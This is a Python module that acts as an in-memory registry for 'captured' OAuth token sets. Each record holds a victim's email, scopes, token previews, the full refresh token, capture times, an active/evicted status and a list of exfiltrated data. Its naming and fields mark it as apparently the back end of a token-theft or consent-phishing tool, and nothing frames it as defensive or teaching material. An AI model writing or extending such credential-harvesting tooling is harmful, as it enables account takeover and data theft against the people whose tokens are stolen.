import uuid
import time
from typing import Optional

# In-memory token registry: token_id -> token record
_store: dict = {}


def add(email: str, scopes: list, id_token: str,
        refresh_token: str, access_token: str = "") -> str:
    """Store a captured token set and return its registry ID."""
    tid = str(uuid.uuid4())[:8].upper()
    _store[tid] = {
        "id": tid,
        "email": email,
        "scopes": scopes,
        "access_token_preview": (access_token[:48] + "...") if access_token else "N/A",
        "id_token_preview": (id_token[:48] + "...") if id_token else "N/A",
        "refresh_token": refresh_token or "not_granted",
        "has_refresh": bool(refresh_token),
        "captured_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "captured_at_display": time.strftime("%H:%M:%S"),
        "status": "active",   # "active" | "evicted"
        "exfil_data": []
    }
    return tid


def get(tid: str) -> Optional[dict]:
    return _store.get(tid)


def get_all() -> list:
    return list(_store.values())


def evict(tid: str) -> bool:
    if tid in _store:
        _store[tid]["status"] = "evicted"
        _store[tid]["evicted_at"] = time.strftime("%H:%M:%S")
        return True
    return False


def add_exfil(tid: str, data: list):
    if tid in _store:
        _store[tid]["exfil_data"] = data
